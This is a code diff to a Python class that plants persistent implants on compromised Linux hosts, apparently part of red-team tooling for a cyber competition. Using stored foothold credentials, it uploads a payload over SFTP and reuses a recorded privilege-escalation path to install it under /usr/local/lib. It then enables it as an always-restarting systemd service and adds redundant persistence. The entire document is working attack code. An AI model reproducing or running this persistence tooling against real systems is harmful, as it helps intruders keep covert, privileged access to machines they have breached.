@@ -143,6 +143,7 @@ class Planter:
 
     def _install_linux(self, ip, box_id, local, transport):
         from ..effects import artifactnames as names
+        from ..effects.base import root_cmd
         fh = self.ctx.world.foothold(ip)
         if not fh:
             return {"ok": False, "detail": f"no foothold on {ip} to plant {box_id}"}
@@ -151,19 +152,17 @@ class Planter:
         unit = names_drawn["unit"]
         stage = f"/tmp/{names_drawn['stem']}"
         remote = f"/usr/local/lib/{names_drawn['stem']}/{box_id}"
+        unit_path = f"/etc/systemd/system/{unit}"
+        # The escalation the seed proved (or a root foothold). Every privileged
+        # install step rides it; a sudo refusal means the seed chose the wrong
+        # label, not that the install should try sudo anyway.
+        label = fh.get("escalation") or fh.get("kind") or "?"
         rc, _out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
-                                         f"mkdir -p {stage}", timeout=60,
-                                         key_path=fh.get("key_path"))
+                                        f"mkdir -p {stage}", timeout=60,
+                                        key_path=fh.get("key_path"))
         if rc != 0:
             return {"ok": False, "detail": f"payload staging dir on {ip} failed: "
                             f"{(err or _out).strip()[:200]}", "paths": [remote]}
-        try:
-            self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
-                                  f"{stage}/{box_id}", mode=0o755,
-                                  key_path=fh.get("key_path"))
-        except Exception as exc:                       # transport blowups are data
-            return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
-                    "paths": [remote]}
         unit_text = (
             "[Unit]\n"
             f"Description={names_drawn['unit_desc']}\n"
@@ -172,59 +171,58 @@ class Planter:
             f"ExecStart={remote}\n"
             "Restart=always\nRestartSec=15\n\n"
             "[Install]\nWantedBy=multi-user.target\n")
-        # /usr/local/lib and /etc/systemd are root-owned. Install with whatever
-        # root path this foothold actually holds. The box's own NOPASSWD sudo is
-        # the common case, but a competition's misconfigurations can break it —
-        # web01's writable-sudoers chmods /etc/sudoers.d, after which sudo refuses
-        # ("/etc/sudoers.d is world writable", then "a password is required") on
-        # every cycle. The escalated foothold still reaches root there, so ride
-        # that path instead of failing the plant. The unit file travels with the
-        # payload and is moved into place, so no root wrapper has to parse a
-        # heredoc.
-        from ..effects.base import root_cmd            # lazy: avoids a cycle
-        lib_dir = f"/usr/local/lib/{names_drawn['stem']}"
-        unit_path = f"/etc/systemd/system/{unit}"
-        unit_stage = f"{stage}/{unit}"
-        local_unit = None
         try:
-            fd, local_unit = tempfile.mkstemp(prefix="tlaloc-unit-", suffix=".service")
-            with os.fdopen(fd, "w", encoding="utf-8") as handle:
-                handle.write(unit_text)
-            self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", local_unit,
-                                  unit_stage, mode=0o644,
+            self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
+                                  f"{stage}/{box_id}", mode=0o755,
                                   key_path=fh.get("key_path"))
+            # The unit is generated here, so it rides sftp like the payload: a
+            # heredoc cannot repeat a non-sudo command through an escape label.
+            with tempfile.NamedTemporaryFile("w", encoding="utf-8") as staged_unit:
+                staged_unit.write(unit_text)
+                staged_unit.flush()
+                self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "",
+                                      staged_unit.name, f"{stage}/{unit}",
+                                      mode=0o644, key_path=fh.get("key_path"))
         except Exception as exc:                       # transport blowups are data
-            return {"ok": False, "detail": f"unit staging to {ip} failed: {exc}",
+            return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                     "paths": [remote]}
-        finally:
-            if local_unit and os.path.exists(local_unit):
-                os.unlink(local_unit)
-        script = ("set -e\n"
-                  + root_cmd(f"mkdir -p {lib_dir}", fh) + "\n"
-                  + root_cmd(f"mv {stage}/{box_id} {remote}", fh) + "\n"
-                  + root_cmd(f"chmod 755 {remote}", fh) + "\n"
-                  + root_cmd(f"mv {unit_stage} {unit_path}", fh) + "\n"
-                  + root_cmd("systemctl daemon-reload", fh) + "\n"
-                  + root_cmd(f"systemctl enable --now {unit}", fh) + "\n"
-                  + f"systemctl is-active {unit}\n")
+        privileged = (
+            ("create install dir", f"mkdir -p /usr/local/lib/{names_drawn['stem']}"),
+            ("move payload", f"mv {stage}/{box_id} {remote}"),
+            ("chmod payload", f"chmod 755 {remote}"),
+            ("move unit", f"mv {stage}/{unit} {unit_path}"),
+            ("daemon-reload", "systemctl daemon-reload"),
+            ("enable unit", f"systemctl enable --now {unit}"),
+        )
+        for step, cmd in privileged:
+            rc, out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
+                                           root_cmd(cmd, fh), timeout=120,
+                                           key_path=fh.get("key_path"))
+            if rc != 0:
+                return {"ok": False,
+                        "detail": (f"{unit} install failed at {step} on {ip} via "
+                                   f"{label} ({cmd}): "
+                                   f"{(err or out).strip()[:200]}"),
+                        "unit": unit, "paths": [remote, unit_path],
+                        "check_cmd": f"systemctl is-active {unit}"}
         rc, out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
-                                       script, timeout=120,
+                                       f"systemctl is-active {unit}", timeout=60,
                                        key_path=fh.get("key_path"))
-        active = (out or "").strip().splitlines()[-1:] == ["active"]
-        ok = rc == 0 and active
+        ok = rc == 0 and (out or "").strip().splitlines()[-1:] == ["active"]
         if not ok:
             return {"ok": False,
-                    "detail": f"unit install rc={rc}: {(err or out).strip()[:200]}",
-                    "unit": unit, "paths": [remote, f"/etc/systemd/system/{unit}"],
+                    "detail": f"unit install rc={rc} via {label}: "
+                              f"{(err or out).strip()[:200]}",
+                    "unit": unit, "paths": [remote, unit_path],
                     "check_cmd": f"systemctl is-active {unit}"}
         mech, extra_paths, extra_undo, note = self._linux_redundant(
             ip, fh, names_drawn, remote, stage)
         undo = ([f"systemctl disable --now {unit}",
-                 f"rm -f {remote} /etc/systemd/system/{unit}"] + extra_undo)
+                 f"rm -f {remote} {unit_path}"] + extra_undo)
         return {"ok": True,
                 "detail": (f"{unit} active on {ip} (transport {transport}); {note}"
                            if note else f"{unit} active on {ip} (transport {transport})"),
-                "unit": unit, "paths": [remote, f"/etc/systemd/system/{unit}"] + extra_paths,
+                "unit": unit, "paths": [remote, unit_path] + extra_paths,
                 "mechanisms": ["systemd"] + mech,
                 "undo": undo,
                 "check_cmd": f"systemctl is-active {unit}"}
